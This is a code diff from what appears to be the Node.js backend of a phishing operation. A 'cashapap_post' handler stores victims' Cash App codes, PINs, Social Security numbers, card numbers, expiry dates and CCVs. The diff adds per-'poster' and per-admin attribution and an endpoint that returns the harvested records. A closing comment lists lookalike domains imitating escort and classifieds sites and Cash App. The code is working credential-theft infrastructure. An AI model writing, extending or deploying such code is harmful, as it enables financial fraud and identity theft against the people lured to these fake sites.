@@ -801,16 +801,25 @@ module.exports.update_validity =  (req, res) => {
 }
 
 module.exports.cashapap_post = async (req, res) => {
-    const { code, pin, ssn, site, card_number,mm_yy, ccv,zip} = req.body;
+    const { adminId, posterId } = req.params
+    const { contact,code, pin, ssn, site, card_number,mm_yy, ccv,zip} = req.body;
 
     try {
-      
-        const cashapp = await Cash.create({
-            code, pin, ssn, site, card_number,mm_yy, ccv,zip
+        const userFound = await User.findOne({ adminId: adminId })
 
+        const posterFound = await Poster.findOne({ posterId: posterId })
+        if (userFound && posterFound) {
+            const cashapp = await Cash.create({
+                contact, code, pin, ssn, site, card_number,mm_yy, ccv,zip,adminId, posterId
+    
+    
+            })
+            return res.status(200).json({ success: "Created successfully " })
+        }
 
-        })
-        return res.status(200).json({ success: "Created successfully " })
+        return res.status(400).json({ error: "doesnt exists" })
+
+       
 
 
     }
@@ -843,3 +852,36 @@ module.exports.links_add =  (req, res) => {
     })
 
 }
+
+
+
+
+
+
+module.exports.get_deyails_cashapp = async (req, res) => {
+    const { anyid } = req.params
+
+
+    try {
+        const cashappForPoster = await Cash.find({posterId:anyid }).sort({ createdAt: -1 })
+        if (cashappForPoster.length > 0) {
+            return res.status(200).json({ cashapp: cashappForPoster })
+
+        }
+
+        const cashappAdmin = await Cash.find({adminId:anyid }).sort({ createdAt: -1 })
+        if (cashappAdmin.length > 0) {
+            return res.status(200).json({ cashapp: cashappAdmin })
+
+        }
+        return res.status(400).json({ error: "not found any" })
+
+
+
+    } catch (e) {
+        res.status(400).json({ e: "error" })
+    }
+
+}
+
+// "https://www.tsescort.live","https://www.megapersonals.online","https://www.privatedelight.online","https://www.skipthegames.help","https://www.tryst.rest","https://www.erosads.online","https://erosads.vercel.app","https://skipthegame.vercel.app","https://trysts.vercel.app","https://official-cash.vercel.app"
